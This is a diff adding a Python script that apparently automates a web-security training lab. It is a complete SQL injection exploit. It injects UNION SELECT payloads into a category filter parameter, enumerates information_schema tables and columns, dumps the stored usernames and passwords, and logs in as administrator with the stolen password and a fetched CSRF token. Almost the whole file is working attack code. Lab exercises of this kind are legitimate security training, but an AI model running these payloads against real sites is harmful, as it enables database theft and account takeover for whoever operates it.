@@ -1,0 +1,149 @@
+from lib import (
+    SESSION,
+    LOGIN_CSRF_XPATH,
+    get_csrf_token,
+    check_is_lab_solved,
+    generate_parser,
+    find_no_of_columns,
+    find_columns_of_type_string,
+    print_table,
+)
+import re
+from lxml import html
+
+if __name__ == "__main__":
+    args = generate_parser()
+
+    lab_url = args.lab_url.strip("/")
+
+    columns = find_no_of_columns(
+        f"{lab_url}/filter?category=",
+    )
+
+    target_columns = find_columns_of_type_string(
+        lab_url_with_end_point=f"{lab_url}/filter?category=",
+        no_of_columns=columns,
+    )
+
+    users_table_name = ""
+    username_column_name = ""
+    password_column_name = ""
+    administrator_password = ""
+
+    print("[!] Finding the users table name")
+    print("[!] Fetching the information_schema.tables")
+
+    query = "' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables --"
+
+    print(f"[!] Making query: {lab_url}/filter?category={query}")
+
+    response = SESSION.get(f"{lab_url}/filter?category={query}")
+
+    if response.status_code == 200:
+        results = re.search(r"\busers_.+?\b", response.text)
+        if results:
+            users_table_name = results.group(0)
+
+    else:
+        print("[-] Failed to fetch the information_schema.tables")
+        exit()
+
+    print(f"[+] Successfully enumerated the users table name: {users_table_name}")
+
+    print("[!] Fetching the column names from the users table")
+    print(f"[!] Fetching the information_schema.columns for table {users_table_name}")
+
+    query = f"' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name='{users_table_name}'--"
+
+    print(f"[!] Making query: {lab_url}/filter?category={query}")
+
+    response = SESSION.get(f"{lab_url}/filter?category={query}")
+
+    if response.status_code == 200:
+        tree = html.fromstring(response.text)
+
+        column_names = tree.xpath("//table/tbody/tr/th/text()")
+        data_types = tree.xpath("//table/tbody/tr/td/text()")
+
+        print(f"[+] Found the column names of the table {users_table_name}:")
+
+        print_table(
+            column_names=["Column Name", "Data Type"],
+            rows=list(zip(column_names, data_types)),
+        )
+
+        for column in column_names:
+            if column.startswith("password_"):
+                password_column_name = column
+            if column.startswith("username_"):
+                username_column_name = column
+
+    else:
+        print(
+            f"[-] Failed to fetch the information_schema.columns for table {users_table_name}"
+        )
+        exit()
+
+    print(f"[!] Fetching the rows from the `{users_table_name}` table")
+
+    query = f"' UNION SELECT {username_column_name}, {password_column_name} FROM {users_table_name}--"
+
+    print(f"[!] Making query: {lab_url}/filter?category={query}")
+
+    response = SESSION.get(f"{lab_url}/filter?category={query}")
+
+    if response.status_code == 200:
+        tree = html.fromstring(response.text)
+
+        usernames = tree.xpath("//table/tbody/tr/th/text()")
+        passwords = tree.xpath("//table/tbody/tr/td/text()")
+
+        print(f"[+] Fetched the rows of the table {users_table_name}:")
+
+        zipped = list(zip(usernames, passwords))
+
+        print_table(
+            column_names=[username_column_name, password_column_name],
+            rows=zipped,
+        )
+
+        administrator_password = passwords[usernames.index("administrator")]
+
+    else:
+        print(f"[-] Failed to fetch the rows from the `{users_table_name}` table")
+        exit()
+
+    if administrator_password:
+        print(f"[+] Found administrator password: {administrator_password}")
+    else:
+        print("[-] Failed to find administrator password")
+        exit()
+
+    print("[!] Now logging in as administrator")
+
+    # Extracting the login form csrf token using xpath
+    login_csrf_token = get_csrf_token(
+        # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
+        SESSION.get(url=f"{lab_url}/login").text,
+        LOGIN_CSRF_XPATH,
+    )
+
+    print(f"[+] Login CSRF Token: {login_csrf_token}")
+
+    if (
+        SESSION.post(
+            url=f"{lab_url}/login",
+            data={
+                "username": "administrator",
+                "password": administrator_password,
+                "csrf": login_csrf_token,
+            },
+        ).status_code
+        == 200
+    ):
+        print("[+] Logged in as administrator successfully")
+    else:
+        print("[-] Failed to login as administrator")
+        exit()
+
+    check_is_lab_solved(lab_url)
